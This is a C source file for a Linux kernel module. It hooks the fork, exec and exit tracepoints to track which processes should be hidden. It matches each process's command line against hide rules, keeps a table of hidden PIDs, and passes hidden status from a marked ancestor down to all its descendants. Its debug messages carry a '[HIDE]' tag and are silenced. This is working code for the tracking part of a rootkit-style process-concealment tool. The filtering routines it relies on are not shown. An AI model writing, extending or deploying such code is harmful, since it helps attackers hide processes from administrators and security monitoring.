#include "core/lifecycle.h"
#include "core/proc_state.h"
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/tracepoint.h>
#include <linux/pid.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/mm.h>
#include <linux/uaccess.h>

#define CMDLINE_MAX 512

struct hidden_pid_entry {
    pid_t pid;
    struct hlist_node node;
};
DEFINE_HASHTABLE(hidden_pid_table, 8);
static DEFINE_SPINLOCK(hidden_pid_lock);

/* ---------------- Hidden PID 操作 ---------------- */
void add_hidden_pid(pid_t pid)
{
    struct hidden_pid_entry *entry, *tmp;
    unsigned long flags;

    spin_lock_irqsave(&hidden_pid_lock, flags);
    hash_for_each_possible(hidden_pid_table, tmp, node, pid) {
        if (tmp->pid == pid) {
            spin_unlock_irqrestore(&hidden_pid_lock, flags);
            return;
        }
    }

    entry = kmalloc(sizeof(*entry), GFP_ATOMIC);
    if (!entry) { spin_unlock_irqrestore(&hidden_pid_lock, flags); return; }
    entry->pid = pid;
    hash_add(hidden_pid_table, &entry->node, pid);
    spin_unlock_irqrestore(&hidden_pid_lock, flags);
}

bool is_hidden_pid(pid_t pid)
{
    struct hidden_pid_entry *entry;
    bool found = false;
    unsigned long flags;

    spin_lock_irqsave(&hidden_pid_lock, flags);
    hash_for_each_possible(hidden_pid_table, entry, node, pid) {
        if (entry->pid == pid) { found = true; break; }
    }
    spin_unlock_irqrestore(&hidden_pid_lock, flags);
    return found;
}

void remove_hidden_pid(pid_t pid)
{
    struct hidden_pid_entry *entry;
    struct hlist_node *tmp;
    int bkt;
    unsigned long flags;

    spin_lock_irqsave(&hidden_pid_lock, flags);
    hash_for_each_safe(hidden_pid_table, bkt, tmp, entry, node) {
        if (entry->pid == pid) {
            hash_del(&entry->node);
            kfree(entry);
            break;
        }
    }
    spin_unlock_irqrestore(&hidden_pid_lock, flags);
}

void clear_hidden_pid_table(void)
{
    struct hidden_pid_entry *entry;
    struct hlist_node *tmp;
    int bkt;
    unsigned long flags;

    spin_lock_irqsave(&hidden_pid_lock, flags);
    hash_for_each_safe(hidden_pid_table, bkt, tmp, entry, node) {
        hash_del(&entry->node);
        kfree(entry);
    }
    spin_unlock_irqrestore(&hidden_pid_lock, flags);
}

/* ---------------- 查找祖宗隐藏 ---------------- */

/* ---------------- 核心判断 ---------------- */
bool should_hide_process(pid_t pid, const char *cmdline)
{
    if (proc_is_hidden(pid)) return true;
    if (is_hidden_pid(pid)) return true;
    if (cmdline && str_entry_is_excluded(cmdline)) return true;
    return false;
}

/* ---------------- mark_hidden_if_needed ---------------- */
void mark_hidden_if_needed(struct task_struct *task, struct linux_binprm *bprm)
{
    if (!task) return;

    char full_cmdline[CMDLINE_MAX] = {0};

    // 从 task_struct->mm 获取完整 cmdline
    struct mm_struct *mm = get_task_mm(task);
    if (mm) {
        size_t len = 0;
        if (mm->arg_end > mm->arg_start)
            len = min((size_t)(mm->arg_end - mm->arg_start), (size_t)(CMDLINE_MAX - 1));
        if (len) {
            if (copy_from_user(full_cmdline, (const char __user *)mm->arg_start, len))
                full_cmdline[0] = '\0';
            else
                for (size_t i = 0; i < len; i++)
                    if (full_cmdline[i] == '\0')
                        full_cmdline[i] = ' ';
        }
        mmput(mm);
    }

    // fallback bprm->buf
    if (full_cmdline[0] == '\0' && bprm)
        strncpy(full_cmdline, bprm->buf, CMDLINE_MAX - 1);

    pid_t ppid = task->real_parent ? task->real_parent->pid : 0;

    // 自身是否匹配隐藏规则
    bool self_hidden = should_hide_process(task->pid, full_cmdline);

    // 仅继承祖宗根节点隐藏状态
    bool ancestor_hidden = false;
    if (ppid > 0) {
        struct proc_state *ps_parent = proc_state_get(ppid);
        if (ps_parent)
            ancestor_hidden = ps_parent->is_ancestor_root;
    }

    // 是否标记为祖宗根节点
    bool is_ancestor_root = self_hidden;

    u32 flags = 0;
    if (self_hidden) flags |= PROC_HIDDEN_SELF;
    if (ancestor_hidden) flags |= PROC_HIDDEN_INHERITED;

    // 更新 proc_state
    proc_state_set(task->pid, ppid, flags, ancestor_hidden, is_ancestor_root);

    // 加入 hidden_pid_table
    if (self_hidden || ancestor_hidden)
        add_hidden_pid(task->pid);

    /*pr_info("[HIDE][FINAL] pid=%d ppid=%d self=%d ancestor=%d is_root=%d cmd=%s\n",
            task->pid, ppid, self_hidden, ancestor_hidden,
            is_ancestor_root, full_cmdline[0] ? full_cmdline : "<NULL>");*/
}


/* ---------------- Tracepoints ---------------- */
void on_fork(void *ignore, struct task_struct *parent, struct task_struct *child)
{
    if (!parent || !child) return;

    // 确保父进程 proc_state 已初始化
    if (!proc_state_get(parent->pid))
        mark_hidden_if_needed(parent, NULL);

    // 子进程继承祖宗根节点状态
    proc_state_inherit(parent->pid, child->pid);

    // 标记子进程是否需要隐藏
    mark_hidden_if_needed(child, NULL);

    /*pr_info("[HIDE][DEBUG] fork: parent=%d child=%d child_hidden=%d ancestor_hidden=%d\n",
            parent->pid, child->pid,
            proc_is_hidden(child->pid),
            proc_state_any_ancestor_hidden(child->pid));*/
}

void on_exec(void *ignore, struct task_struct *task,
             pid_t old_pid, struct linux_binprm *bprm)
{
    if (!task) return;

    // 标记当前进程（exec 后可能 cmdline 发生变化）
    mark_hidden_if_needed(task, bprm);

    /*pr_info("[HIDE][DEBUG] exec: pid=%d cmdline=%s hidden=%d ancestor_hidden=%d\n",
            task->pid,
            bprm && bprm->buf ? bprm->buf : "<NULL>",
            proc_is_hidden(task->pid),
            proc_state_any_ancestor_hidden(task->pid));*/
}


void on_exit(void *ignore, struct task_struct *task)
{
    if (!task) return;

    proc_state_clear(task->pid);
    remove_hidden_pid(task->pid);

    /*pr_info("[HIDE][DEBUG] exit: pid=%d removed from proc_state and hidden_pid_table\n",
            task->pid);*/
}

// Tracepoint 指针
static struct tracepoint *tp_fork;
static struct tracepoint *tp_exec;
static struct tracepoint *tp_exit;

void find_tracepoints_cb(struct tracepoint *tp, void *ignore)
{
    if (strcmp(tp->name, "sched_process_fork") == 0)
        tp_fork = tp;
    else if (strcmp(tp->name, "sched_process_exec") == 0)
        tp_exec = tp;
    else if (strcmp(tp->name, "sched_process_exit") == 0)
        tp_exit = tp;
}


int lifecycle_init(void)
{
    int ret = 0;

    for_each_kernel_tracepoint(find_tracepoints_cb, NULL);

    if (tp_fork) {
        ret = tracepoint_probe_register(tp_fork, (void *)on_fork, NULL);
        if (ret) {
            // pr_err("[HIDE] failed to register fork tracepoint: %d\n", ret);
            tp_fork = NULL;
        }
    }

    if (tp_exec) {
        ret = tracepoint_probe_register(tp_exec, (void *)on_exec, NULL);
        if (ret) {
            // pr_err("[HIDE] failed to register exec tracepoint: %d\n", ret);
            tp_exec = NULL;
        }
    }

    if (tp_exit) {
        ret = tracepoint_probe_register(tp_exit, (void *)on_exit, NULL);
        if (ret) {
            // pr_err("[HIDE] failed to register exit tracepoint: %d\n", ret);
            tp_exit = NULL;
        }
    }

    // pr_info("[HIDE] lifecycle module initialized\n");
    return 0;
}

void lifecycle_cleanup(void)
{
    if (tp_fork) {
        tracepoint_probe_unregister(tp_fork, (void *)on_fork, NULL);
        tp_fork = NULL;
    }

    if (tp_exec) {
        tracepoint_probe_unregister(tp_exec, (void *)on_exec, NULL);
        tp_exec = NULL;
    }

    if (tp_exit) {
        tracepoint_probe_unregister(tp_exit, (void *)on_exit, NULL);
        tp_exit = NULL;
    }

    clear_hidden_pid_table();
    // pr_info("[HIDE] lifecycle module cleaned up\n");
}


